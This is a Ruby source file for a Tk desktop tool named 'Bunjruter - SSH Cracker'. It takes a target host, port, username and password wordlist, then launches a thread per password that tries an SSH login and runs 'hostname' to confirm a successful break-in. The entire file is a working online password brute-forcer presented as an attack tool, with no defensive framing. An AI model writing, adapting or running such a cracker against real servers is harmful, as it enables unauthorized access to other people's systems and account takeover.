$VERBOSE = nil
require 'tk'
require 'net/ssh'
require 'optparse'
require 'pp'
require 'colorize'

# Content
root_icon = TkPhotoImage.new(file: './project_bunjruter_contents/project_bunjruter_icons/bunjruter_ssh_cracker.png')
font_name = "Calibri"
font_size = 10
custom_font = TkFont.new(family: font_name, size: font_size)

# Main
root = TkRoot.new
root.geometry("250x470")
root.title("Bunjruter - SSH Cracker")
root.resizable(false, false)
root.iconphoto(root_icon)

# Label Frame
root_label_frame = TkLabelFrame.new(root, text: "SSH Cracker", font: custom_font, relief: 'raised', borderwidth: 1)
root_label_frame.place(x: 10, y: 5, width: 230, height: 450)

# Host Stage
host_label = TkLabel.new(root) do
  font custom_font
  text "Host:"
  place(x: 22, y: 30)
end

$host_entry = TkText.new(root) do
  place(x: 22, y: 55)
  width 25
  height 1
end

# Port Stage
port_label = TkLabel.new(root) do
  font custom_font
  text "Port:"
  place(x: 22, y: 80)
end

$port_entry = TkText.new(root) do
  place(x: 22, y: 105)
  width 11
  height 1
end

$port_entry.insert("1.0", "22")

# Sleep per attempt
sleep_label = TkLabel.new(root) do
  font custom_font
  text "Wait every try:"
  place(x: 130, y: 80)
end

$sleep_textbox = TkText.new(root) do
  place(x: 130, y: 105)
  width 11
  height 1
end

# Username Location Stage
username_label = TkLabel.new(root) do
  font custom_font
  text "Username:"
  place(x: 22, y: 130)
end

$username_entry = TkText.new(root) do
  place(x: 22, y: 155)
  width 25
  height 1
end

# Passlist Location Stage
passlist_label = TkLabel.new(root) do
  font custom_font
  text "Passlist Location:"
  place(x: 22, y: 180)
end

$passlist_location_entry = TkText.new(root) do
  place(x: 22, y: 205)
  width 25
  height 1
end

# Output Stage
output_label = TkLabel.new(root) do
  font custom_font
  text "Output:"
  place(x: 22, y: 230)
end

$output_textbox = TkText.new(root) do
  place(x: 22, y: 255)
  height 9
  width 25
end

$passlist_location_entry.insert("1.0", "./bunjruter_ssh_cracker/wordlist.txt")

class BruteForce
  attr_accessor :conf, :debug, :host, :user, :passwordfile, :port, :timeout

  def initialize
    @passwordfile = ENV['HOME'] + "/.ssh-brute-force.list"
    @port = 22 # Default port
  end

  def run
    raise "please set a user" if @user.nil?
    raise "please set a host" if @host.nil?
    raise "please set a password file" if @passwordfile.nil?

    threads = []

    file = File.open(@passwordfile)
    file.each do |pw|
      password = pw.strip
      threads << Thread.new do
        result_message = "-> " + (Net::SSH.start(@host, @user, :password => password, :timeout => @timeout, :port => @port) ? "ok" : "false")
        $output_textbox.insert("end", "Tried Password: #{password}, #{result_message}\n")
        if check_host(@host, @user, password)
          $output_textbox.insert("1.0" , "-> " + "ok" , 'green')
        else
          $output_textbox.insert("1.0" , "-> " + "false" , 'red')
        end
      end
    end

    threads.each(&:join)
  rescue RuntimeError => e
  end

  private

  def check_host(host, user, pass)
    Net::SSH.start(host, user, :password => pass, :timeout => @timeout, :port => @port) do |ssh|
      ssh.exec!("hostname")
    end
    return true
  rescue => e
    return false
  end
end

def start_ssh_cracker
  thread = Thread.new do
    $output_textbox.delete("1.0", "end")
    bf = BruteForce.new
    bf.user = $username_entry.get("1.0", "end-1c")
    bf.host = $host_entry.get("1.0", "end-1c")
    bf.timeout = $sleep_textbox.get("1.0", "end-1c").strip.to_i
    bf.passwordfile = $passlist_location_entry.get("1.0", "end-1c")
    bf.port = $port_entry.get("1.0", "end-1c").strip.to_i

    bf.run
  end
end

# Start Attack Button
$attack_button = TkButton.new(root) do
  text "Start SSH Cracker"
  fg "white"
  bg "#A30039"
  place(x: 70, y: 420)
  command { start_ssh_cracker }
end

Tk.mainloop
